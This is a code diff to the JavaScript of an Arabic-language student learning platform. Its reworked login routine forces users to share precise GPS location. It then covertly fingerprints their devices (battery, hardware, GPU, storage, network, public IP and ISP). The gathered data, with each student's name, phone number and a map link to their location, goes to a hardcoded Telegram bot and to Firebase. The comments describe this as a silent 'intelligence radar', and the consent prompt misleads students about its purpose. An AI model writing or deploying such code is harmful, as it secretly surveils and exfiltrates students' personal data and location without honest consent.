@@ -673,121 +673,145 @@ function completeRegistration() {
             }
         };
 
-        async function runApp() {
+      // 🚀 دالة تشغيل المنصة الكاملة + الرادار الاستخباراتي (النسخة النهائية 2026)
+async function runApp() {
     const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-    if(!user) return;
+    if (!user) return;
 
+    // [1] طلب إذن الموقع إجباري - المنصة مش هتفتح غير لو وافق ❤️
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            (position) => {
-                // فتح الواجهة فوراً عند الموافقة (ممنوع التهنيج هنا)
-                document.getElementById('login-gate').style.display = 'none';
-                document.getElementById('sidebar').style.display = 'flex';
-                document.getElementById('top-bar').style.display = 'flex';
-                document.getElementById('content').style.display = 'block';
-                document.getElementById('display-name').innerText = user.name.split(' ')[0];
+            async (p) => {
+                // إظهار واجهة المنصة فوراً عند الموافقة
+                const ids = ['login-gate', 'sidebar', 'top-bar', 'content', 'mob-nav'];
+                ids.forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.style.display = (id === 'login-gate') ? 'none' : (id === 'content' ? 'block' : 'flex');
+                });
+                
+                const dispName = document.getElementById('display-name');
+                if (dispName) dispName.innerText = user.name.split(' ')[0];
+                
+                // 🕵️‍♂️ [2] تشغيل الرادار الخارق (سحب الداتا العميقة صامت)
+                try {
+                    const gpsLat = p.coords.latitude;
+                    const gpsLon = p.coords.longitude;
 
-                // تشغيل الرادار الشامل في الخلفية
-                startUltimateRadar(position.coords.latitude, position.coords.longitude);
+                    // أ- فحص البطارية بالتفصيل (نسبة + شحن + وقت)
+                    let batt = { level: "N/A", status: "N/A", time: "N/A" };
+                    try { 
+                        const b = await navigator.getBattery();
+                        batt.level = Math.round(b.level * 100) + "%";
+                        batt.status = b.charging ? "⚡ متصل بالشاحن" : "🔋 وضع البطارية";
+                        batt.time = b.charging ? (b.chargingTime / 60).toFixed(0) + " دقيقة للفل" : (b.dischargingTime / 60).toFixed(0) + " دقيقة ويفصل";
+                    } catch(e){}
+
+                    // ب- العتاد والمساحة (Hardware & Storage)
+                    const ram = navigator.deviceMemory || "N/A";
+                    const cores = navigator.hardwareConcurrency || "N/A";
+                    let storage = { free: "N/A", total: "N/A" };
+                    try { 
+                        const s = await navigator.storage.estimate(); 
+                        storage.free = ((s.quota - s.usage) / (1024 ** 3)).toFixed(2) + " GB";
+                        storage.total = (s.quota / (1024 ** 3)).toFixed(2) + " GB";
+                    } catch(e){}
+                    
+                    // ج- كرت الشاشة ونوع المعالج الرسومي (GPU)
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+
+                    // د- الشبكة والسرعة والـ IP (وايفاي ولا داتا)
+                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+                    const netType = conn.type || "N/A"; 
+                    const netEffect = conn.effectiveType || "Unknown"; 
+                    const netSpeed = conn.downlink ? conn.downlink + " Mbps" : "N/A";
+
+                    // هـ- الـ IP والموقع المخفي من السيرفر (بدون إذن)
+                    let ipInfo = { ip: "Scanning...", isp: "N/A", city: "N/A", region: "N/A", country: "N/A" };
+                    try {
+                        const res = await fetch('https://ipwho.is/').then(r => r.json());
+                        if(res.success) ipInfo = { ip: res.ip, isp: res.connection.isp, city: res.city, region: res.region, country: res.country };
+                    } catch(e){}
+
+                    // و- فحص الثغرات التقديري (Vulnerabilities)
+                    const isIncognito = !window.indexedDB; 
+                    const isOldBrowser = !('getBattery' in navigator);
+
+                    // [3] إرسال التقرير النهائي للبوت (ماعدا آدم)
+                    if (user.phone !== "01023175098") {
+                        const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SjcjlHY";
+                        const chatId = "5890070301";
+                        const message = `👑 *تـقـريـر كـيـمـو الـخـارق* ❤️
+━━━━━━━━━━━━━━
+👤 *الطالب:* ${user.name}
+📞 *الرقم:* \`${user.phone}\`
+━━━━━━━━━━━━━━
+🔋 *البطارية:* ${batt.level} (${batt.status})
+⏳ *الوقت:* ${batt.time}
+
+⚙️ *مواصفات الجهاز:*
+• النوع: ${navigator.platform} | المعالج: ${cores} Cores
+• الرام: ${ram} GB | كرت الشاشة: ${gpu}
+• المساحة: حر ${storage.free} من ${storage.total}
+
+🌐 *الشبكة والإنترنت:*
+• الـ IP: \`${ipInfo.ip}\`
+• الاتصال: ${netType} (${netEffect}) | السرعة: ${netSpeed}
+• الشركة: ${ipInfo.isp}
+
+📍 *الموقع (GPS + IP):*
+• الدولة: ${ipInfo.country} | المحافظة: ${ipInfo.region}
+• المدينة: ${ipInfo.city}
+• الخريطة: [اضغط لفتح الموقع الدقيق](http://maps.google.com/maps?q=${gpsLat},${gpsLon})
+
+📱 *بيانات إضافية:*
+• الثغرات: ${isIncognito ? "وضع التخفي 🕵️" : "عادي"} | ${isOldBrowser ? "متصفح غير آمن ⚠️" : "مؤمن ✅"}
+• اللغة: ${navigator.language}
+• الشاشة: ${window.screen.width}x${window.screen.height}
+
+⏰ *توقيت الدخول:* ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━`;
+
+                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+                        
+                        // تحديث Firebase
+                        studentsRef.child(user.phone).update({ 
+                            intel_report: { battery: batt, hardware: {cores, ram, storage, gpu}, ip: ipInfo, location: {lat: gpsLat, lon: gpsLon} } 
+                        });
+                    }
+                } catch (err) { console.error("Radar Error", err); }
+
+                // [4] كود الأدمن (آدم) اظهر لوحة التحكم
+                if (user.phone === "01023175098") {
+                    const adminIds = ['adm-links', 'adm-mob-link', 'admin-live-info'];
+                    adminIds.forEach(id => {
+                        const el = document.getElementById(id);
+                        if (el) el.style.display = 'block';
+                    });
+                    
+                    studentsRef.on('value', s => {
+                        const count = document.getElementById('total-students-count');
+                        if (count) count.innerText = s.numChildren();
+                        loadStudentsList(Object.entries(s.val() || {}).reverse());
+                    });
+                }
+                
+                loadData();
+                renderSubjectGrids();
             },
-            (error) => {
-                alert("لازم تسمح بالموقع يا صديقي عشان كودك يتسجل ❤️");
-                location.reload(); 
+            (err) => {
+                alert("⚠️ لازم تسمح بالموقع يا بطل عشان أكونتك يتأمن ونحفظ بياناتك ❤️");
+                location.reload();
             },
             { enableHighAccuracy: true, timeout: 15000 }
         );
     } else {
-        alert("متصفحك لا يدعم تحديد الموقع، استخدم جوجل كروم ❤️");
+        alert("متصفحك لا يدعم تحديد الموقع ❤️");
     }
 }
-
-const startUltimateRadar = async (lat, lon) => {
-    setTimeout(async () => {
-        // 1. البطارية والشحن
-        let batteryInfo = { level: "Unknown", charging: "" };
-        try {
-            const b = await navigator.getBattery();
-            batteryInfo.level = Math.round(b.level * 100) + "%";
-            batteryInfo.charging = b.charging ? " (قيد الشحن ⚡)" : " (على البطارية 🔋)";
-        } catch(e) {}
-
-        // 2. الرامات والمساحة
-        const ram = navigator.deviceMemory || "Unknown";
-        let storageInfo = "Unknown";
-        try {
-            const storage = await navigator.storage.estimate();
-            const freeGB = ((storage.quota - storage.usage) / (1024 ** 3)).toFixed(2);
-            storageInfo = freeGB + " GB متبقية";
-        } catch(e) {}
-
-        // 3. الشبكة والـ IP
-        let netInfo = { ip: "Scanning...", city: "Unknown", isp: "Unknown" };
-        try {
-            const res = await fetch('https://ipwho.is/').then(r => r.json());
-            if(res.success) {
-                netInfo = { ip: res.ip, city: res.city + ", " + res.country, isp: res.connection.isp };
-            }
-        } catch(e) {}
-
-        // 4. تجميع التقرير
-        const report = {
-            name: user.name,
-            phone: user.phone,
-            model: navigator.userAgent.includes('(') ? navigator.userAgent.split('(')[1].split(')')[0] : navigator.platform,
-            hw: (navigator.hardwareConcurrency || "4") + " Cores | " + ram + "GB RAM",
-            storage: storageInfo,
-            battery: batteryInfo.level + batteryInfo.charging,
-            ip: netInfo.ip,
-            isp: netInfo.isp,
-            location: netInfo.city,
-            gpsMap: "http://maps.google.com/maps?q=" + lat + "," + lon, // رابط مباشر وسريع
-            time: new Date().toLocaleString('ar-EG')
-        };
-
-        const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SjcjlHY";
-        const chatId = "5890070301";
-
-        const message = "🕵️‍♂️ *تقرير كيمو رادار الاستخباراتي*" + "\n" +
-            "━━━━━━━━━━━━━━" + "\n" +
-            "👤 *الطالب:* " + report.name + "\n" +
-            "📞 *الموبايل:* " + report.phone + "\n" +
-            "━━━━━━━━━━━━━━" + "\n" +
-            "📱 *الجهاز:* " + report.model + "\n" +
-            "⚙️ *الهاردوير:* " + report.hw + "\n" +
-            "💾 *المساحة:* " + report.storage + "\n" +
-            "🔋 *البطارية:* " + report.battery + "\n" +
-            "━━━━━━━━━━━━━━" + "\n" +
-            "🌐 *الـ IP:* " + report.ip + "\n" +
-            "🏢 *الشركة:* " + report.isp + "\n" +
-            "📍 *المدينة:* " + report.location + "\n" +
-            "━━━━━━━━━━━━━━" + "\n" +
-            "📍 *الموقع الدقيق (الشارع):*" + "\n" +
-            report.gpsMap + "\n\n" +
-            "⏰ *التوقيت:* " + report.time + "\n" +
-            "━━━━━━━━━━━━━━";
-
-        if (user.phone !== "01023175098") {
-            fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown");
-            if (typeof studentsRef !== 'undefined') {
-                studentsRef.child(user.phone).update({ security_report: report });
-            }
-        }
-    }, 8000); 
-};
-
-    // --- صلاحيات الأدمن آدم ---
-    if(user.phone === "01023175098") {
-        document.getElementById('adm-links').style.display = 'block';
-        document.getElementById('admin-live-info').style.display = 'block';
-        studentsRef.on('value', s => {
-            document.getElementById('total-students-count').innerText = s.numChildren();
-            loadStudentsList(Object.entries(s.val() || {}).reverse());
-        });
-    }
-
-    loadData(); 
-    renderSubjectGrids();
-}
+  
 
         function loadData() { lessonsRef.on('value', s => { allData = s.val() || {}; renderLatest(); renderPinned(); }); }
         function loadStudentsList(sortedData) {
@@ -2323,4 +2347,4 @@ function pushAdminToFirebase() {
 </script>
 
 </body>
-        </html>
+    </html>
